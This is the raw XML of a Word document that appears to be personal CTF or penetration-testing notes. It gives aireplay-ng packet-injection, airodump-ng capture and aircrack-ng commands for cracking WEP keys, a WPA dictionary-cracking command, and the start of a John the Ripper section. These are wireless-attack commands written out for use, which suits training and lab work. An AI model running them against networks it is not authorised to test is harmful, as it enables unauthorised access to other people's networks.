          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>c10c  ....</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>jpDe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>..</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Tg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>....</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16D342A5"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0x0050:  f043 09f6 5418                           .C</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>..</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>T.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41B0658B"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="273468C7" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Use this </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>packet ?</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="20A4679F" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00AA52EE" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E28039F" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00954648">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>You enter “y” to select the packet and start injecting it.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Remember, the smaller the packet, the better. You then start injecting:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="401FC1D4" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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Saving chosen packet in replay_src-0411-145110.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D5BBE68" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63A44DD5" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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Sent 10204 packets...(455 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>pps</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="314ACB1B" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D5EA5C6"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If you have not already started </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">, be sure to start it now. Once you have sufficient IVs, </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="530A6409" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50AC9592" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00970925" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00970925">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00970925">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00970925">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -c 9 --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00970925">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>bssid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00970925">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 -w capture wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07F2D5E3" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="004233BD" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A0422C3" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>you</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> can start </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aircrack-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> and attempt to crack the WEP key.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BB63648" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="784D3EC5" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00970925" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00970925">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aircrack</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00970925">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00970925">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -b 00:14:6C:7E:40:80 capture*.cap </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="466E0ADF" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06A3D7DE"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Another variation of this attack is to use packets from a previous capture. You must have captured the full packets, not just the IVs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="569D24BB"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Here is what the command would look like:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="659705E7" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6DCA654D" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00970925" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00970925">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00970925">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00970925">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 -r capture-01.cap wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="089D3AE1" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12E87F9D" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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 ” -r capture-01.cap” is data from a previous capture.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C747483" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="220E8C2A" w14:textId="77777777" w:rsidR="00B20A28" w:rsidRDefault="00803B63" w:rsidP="00B253E8">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>WPA</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2323EC45" w14:textId="77777777" w:rsidR="0025290C" w:rsidRDefault="0025290C" w:rsidP="00803B63">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="342BD1B5" w14:textId="77777777" w:rsidR="003B1BBD" w:rsidRDefault="008919ED" w:rsidP="00B253E8">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008919ED">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aircrack</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008919ED">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008919ED">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> –w /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008919ED">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>usr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008919ED">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/share/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008919ED">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>dict</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008919ED">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r w:rsidR="003B1BBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>all</w:t>
      </w:r>
      <w:r w:rsidRPr="008919ED">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -b 00:19:5B:52:AD:F7 </w:t>
      </w:r>
      <w:r w:rsidR="003B1BBD" w:rsidRPr="00C70BD1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/root/Desktop/CTF</w:t>
      </w:r>
      <w:r w:rsidR="003B1BBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="003B1BBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>capture.cap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1018E0E7" w14:textId="77777777" w:rsidR="0025290C" w:rsidRDefault="0025290C" w:rsidP="008919ED">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="082296D0" w14:textId="77777777" w:rsidR="008A0D96" w:rsidRPr="001A4FDA" w:rsidRDefault="008A0D96" w:rsidP="00B253E8">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001A4FDA">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>JOHN THE RIPPER</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3200589E" w14:textId="77777777" w:rsidR="008A0D96" w:rsidRPr="008274A1" w:rsidRDefault="008A0D96" w:rsidP="008A0D96">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="525481EF" w14:textId="57A03243" w:rsidR="008A0D96" w:rsidRPr="008274A1" w:rsidRDefault="008A0D96" w:rsidP="008A0D9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20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
